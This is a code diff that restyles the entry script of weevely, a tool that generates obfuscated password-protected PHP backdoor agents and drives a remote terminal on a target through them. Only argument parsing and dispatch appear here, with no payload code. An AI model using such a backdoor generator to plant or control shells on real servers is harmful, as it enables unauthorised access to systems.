@@ -11,40 +11,30 @@ from core.argparsers import CliParser
 import pprint
 import glob
 import os
-import sys
+
 
 def main(arguments):
-
     if arguments.command == 'generate':
-
         obfuscated = generate.generate(
-            password = arguments.password,
-            obfuscator = arguments.obfuscator,
-            agent = arguments.agent
-        )
+            password=arguments.password,
+            obfuscator=arguments.obfuscator,
+            agent=arguments.agent)
 
         generate.save_generated(obfuscated, arguments.path)
 
         log.info(
-        messages.generate.generated_backdoor_with_password_s_in_s_size_i %
-        (arguments.path,
-        arguments.password, len(obfuscated))
-        )
+            messages.generate.generated_backdoor_with_password_s_in_s_size_i %
+            (arguments.path, arguments.password, len(obfuscated)))
 
         return
 
     elif arguments.command == 'terminal':
-        session = SessionURL(
-            url = arguments.url,
-            password = arguments.password
-        )
+        session = SessionURL(url=arguments.url, password=arguments.password)
 
     elif arguments.command == 'session':
         session = SessionFile(arguments.path)
 
-    dlog.debug(
-        pprint.pformat(session)
-    )
+    dlog.debug(pprint.pformat(session))
 
     modules.load_modules(session)
 
@@ -53,43 +43,45 @@ def main(arguments):
     else:
         Terminal(session).onecmd(arguments.cmd)
 
+
 if __name__ == '__main__':
 
     parser = CliParser(prog='weevely')
-    subparsers = parser.add_subparsers(dest = 'command')
+    subparsers = parser.add_subparsers(dest='command')
 
-    terminalparser = subparsers.add_parser('terminal', help='Run terminal or command on the target')
-    terminalparser.add_argument('url', help = 'The agent URL')
-    terminalparser.add_argument('password', help = 'The agent password')
-    terminalparser.add_argument('cmd', help = 'Command', nargs='?')
+    terminalparser = subparsers.add_parser(
+        'terminal', help='Run terminal or command on the target')
+    terminalparser.add_argument('url', help='The agent URL')
+    terminalparser.add_argument('password', help='The agent password')
+    terminalparser.add_argument('cmd', help='Command', nargs='?')
 
-    sessionparser = subparsers.add_parser('session', help='Recover an existing session')
-    sessionparser.add_argument('path', help = 'Session file path')
-    sessionparser.add_argument('cmd', help = 'Command', nargs='?')
+    sessionparser = subparsers.add_parser(
+        'session', help='Recover an existing session')
+    sessionparser.add_argument('path', help='Session file path')
+    sessionparser.add_argument('cmd', help='Command', nargs='?')
 
     agents_available = [
-        os.path.split(agent)[1].split('.')[0] for agent in
-        glob.glob('%s/*.tpl' % agent_templates_folder_path)
+        os.path.split(agent)[1].split('.')[0]
+        for agent in glob.glob('%s/*.tpl' % agent_templates_folder_path)
     ]
 
     obfuscators_available = [
-        os.path.split(agent)[1].split('.')[0] for agent in
-        glob.glob('%s/*.tpl' % obfuscators_templates_folder_path)
+        os.path.split(agent)[1].split('.')[0]
+        for agent in glob.glob('%s/*.tpl' % obfuscators_templates_folder_path)
     ]
 
-    generateparser = subparsers.add_parser('generate', help='Generate new agent')
-    generateparser.add_argument('password', help = 'Agent password')
-    generateparser.add_argument('path', help = 'Agent file path')
+    generateparser = subparsers.add_parser(
+        'generate', help='Generate new agent')
+    generateparser.add_argument('password', help='Agent password')
+    generateparser.add_argument('path', help='Agent file path')
     generateparser.add_argument(
-        '-obfuscator', #The obfuscation method
-        choices = obfuscators_available,
-        default = 'obfusc1_php'
-        )
+        '-obfuscator',  # The obfuscation method
+        choices=obfuscators_available,
+        default='obfusc1_php')
     generateparser.add_argument(
-        '-agent', #The agent channel type
-        choices = agents_available,
-        default = 'obfpost_php'
-        )
+        '-agent',  # The agent channel type
+        choices=agents_available,
+        default='obfpost_php')
 
     parser.set_default_subparser('terminal')
 
